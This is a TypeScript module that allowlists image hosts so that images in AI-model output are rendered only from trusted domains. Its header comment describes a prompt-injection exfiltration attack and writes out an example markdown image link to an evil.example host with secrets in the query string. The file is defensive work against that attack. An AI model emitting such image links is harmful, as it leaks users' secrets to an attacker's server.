// Image-URL gate for MODEL-RENDERED content (markdown images in chat output,
// generative-UI `image` nodes). A remote <img src> in model output is a
// zero-click exfiltration channel: a prompt-injected reply can emit
// `![](https://evil.example/p.png?d=<secrets>)` and the browser sends the data
// the moment the node mounts. So remote images are only auto-rendered when the
// host is one of the platform's own; everything else becomes a placeholder.
//
// This gate is the actual control; the CSP in app/lib/csp.ts is the second layer.
// Tenant brand logos are NOT model output and do not go through here.
//
// Which hosts count as "the platform's own" is deployment config, not code:
// the page origin, the API and site origins (NEXT_PUBLIC_API_BASE_URL,
// NEXT_PUBLIC_SITE_URL) and a comma-separated NEXT_PUBLIC_TRUSTED_IMAGE_HOSTS
// list, where an entry starting with "." matches that domain and every
// subdomain ("." + "example.com" => example.com and *.example.com).

import { getPublicEnv } from "./env";
const ALWAYS_TRUSTED_HOSTS = ["i.ytimg.com"];

function hostOf(url: string | undefined): string | null {
  if (!url) return null;
  try {
    return new URL(url).hostname.toLowerCase();
  } catch {
    return null;
  }
}

function trustedConfig(): { exact: string[]; suffixes: string[] } {
  const exact = [...ALWAYS_TRUSTED_HOSTS];
  const suffixes: string[] = [];
  for (const h of [hostOf(getPublicEnv("NEXT_PUBLIC_API_BASE_URL")), hostOf(getPublicEnv("NEXT_PUBLIC_SITE_URL"))]) {
    if (h) exact.push(h);
  }
  const raw = getPublicEnv("NEXT_PUBLIC_TRUSTED_IMAGE_HOSTS") || "";
  for (const entry of raw.split(",").map((h) => h.trim().toLowerCase()).filter(Boolean)) {
    if (entry.startsWith(".")) {
      exact.push(entry.slice(1));
      suffixes.push(entry);
    } else {
      exact.push(entry);
    }
  }
  return { exact, suffixes };
}

export function isTrustedImageUrl(raw: unknown, pageOrigin?: string): boolean {
  if (typeof raw !== "string") return false;
  const url = raw.trim();
  if (!url) return false;
  if (/^data:image\//i.test(url)) return true;
  if (/^blob:/i.test(url)) return true;
  // Same-origin relative path ("/x.png"), but never protocol-relative ("//host").
  if (url.startsWith("/") && !url.startsWith("//")) return true;
  let parsed: URL;
  try {
    parsed = new URL(url);
  } catch {
    return false;
  }
  if (parsed.protocol !== "https:") return false;
  const host = parsed.hostname.toLowerCase();
  if (pageOrigin) {
    try {
      if (new URL(pageOrigin).origin === parsed.origin) return true;
    } catch {
      /* ignore a malformed origin */
    }
  }
  const { exact, suffixes } = trustedConfig();
  if (exact.includes(host)) return true;
  return suffixes.some((suffix) => host.endsWith(suffix));
}

/** Host for display in the placeholder; never throws. */
export function imageHostLabel(raw: string): string {
  try {
    return new URL(raw).hostname;
  } catch {
    return "unknown host";
  }
}
